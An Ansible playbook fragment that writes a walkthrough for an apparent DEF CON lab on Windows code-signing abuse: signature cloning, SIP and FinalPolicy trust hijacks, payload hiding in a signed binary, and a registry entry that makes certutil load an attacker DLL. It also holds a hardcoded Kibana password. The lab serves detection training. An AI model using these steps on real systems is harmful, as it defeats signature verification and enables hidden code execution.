# ── Desktop: START_HERE.txt ──────────────────────────────────────────
- name: Write START_HERE.txt to Desktop
  ansible.windows.win_copy:
    content: |
      ============================================
       TrustMeBro DEF CON Lab - START HERE
      ============================================

      Open Kibana first: Edge opens it automatically, or go to
      https://10.1.10.10:5601  (elastic / TrustMeBro2026!)

      All commands run from C:\Demo\TrustMeBro on this machine.
      Open a terminal: right-click Desktop > Open in Terminal

      ── STEP 1: Steal a signature ─────────────────────────

        cd C:\Demo\TrustMeBro
        TrustMeBro.exe steal C:\Demo\donors\explorer.exe C:\Demo\unsigned_agent.exe --clone

        Then copy the signed binary to TARGET:
        copy C:\Demo\unsigned_agent.exe \\10.1.10.30\C$\Temp\agent.exe

      ── STEP 2: SIP hijack (run on TARGET via RDP or SSH) ─

        ssh localuser@10.1.10.30
        cd C:\Temp
        TrustMeBro.exe hijack --sip-types PE

        Log out and log back in. Run C:\Temp\agent.exe
        Check Kibana for alerts (or lack of them).

      ── STEP 3: FinalPolicy bypass (on TARGET) ────────────

        TrustMeBro.exe hijack --finalpolicy

        Log out and log back in. Every signature check passes.
        Run any unsigned binary. Check Kibana.

      ── STEP 4: SigStash payload delivery ─────────────────

        On DEVBOX:
        TrustMeBro.exe embed C:\Demo\payload.bin C:\Demo\donors\explorer.exe C:\Demo\carrier.exe --camouflage

        Copy to TARGET:
        copy C:\Demo\carrier.exe \\10.1.10.30\C$\Temp\carrier.exe

        On TARGET, verify signature is still valid:
        powershell "(Get-AuthenticodeSignature C:\Temp\carrier.exe).Status"

        Extract the hidden payload:
        TrustMeBro.exe extract C:\Temp\carrier.exe C:\Temp\recovered.bin
        type C:\Temp\recovered.bin

      ── STEP 5: FormatGhost analyst trap ──────────────────

        On TARGET (admin):
        reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptDllFormatObject\1.3.6.1.4.1.311.99.1" /v Dll /t REG_SZ /d "C:\Temp\format_ghost.dll" /f
        reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptDllFormatObject\1.3.6.1.4.1.311.99.1" /v FuncName /t REG_SZ /d "FormatObject" /f

        Now run: certutil -dump C:\Temp\carrier.exe
        The DLL loads into certutil. Check %TEMP%\format_ghost_payload.bin

      ── STEP 6: Review Kibana dashboard ───────────────────

        Open Kibana. Review which techniques generated alerts
        and which were invisible. Discuss detection gaps.

      ── CLEANUP ───────────────────────────────────────────

        On TARGET: TrustMeBro.exe clean --all
    dest: C:\Users\localuser\Desktop\START_HERE.txt
    force: true
  failed_when: false

- name: Write START_HERE.txt to Public Desktop (fallback)
  ansible.windows.win_copy:
    content: |
      ============================================
       TrustMeBro DEF CON Lab - START HERE
      ============================================
      See C:\Users\localuser\Desktop\START_HERE.txt for full steps.
      Or open Edge - Kibana dashboard loads automatically.
    dest: C:\Users\Public\Desktop\START_HERE.txt
    force: true

# ── Desktop: shortcut to C:\Demo\TrustMeBro ──────────────────────────
- name: Create TrustMeBro shortcut on Desktop
  ansible.windows.win_shortcut:
    src: C:\Demo\TrustMeBro
    dest: C:\Users\localuser\Desktop\TrustMeBro.lnk
    description: TrustMeBro toolkit
  failed_when: false

- name: Create Terminal Here shortcut on Desktop
  ansible.windows.win_shortcut:
    src: C:\Windows\System32\cmd.exe
    dest: C:\Users\localuser\Desktop\Terminal (TrustMeBro).lnk
    directory: C:\Demo\TrustMeBro
    description: Open terminal in TrustMeBro directory
  failed_when: false
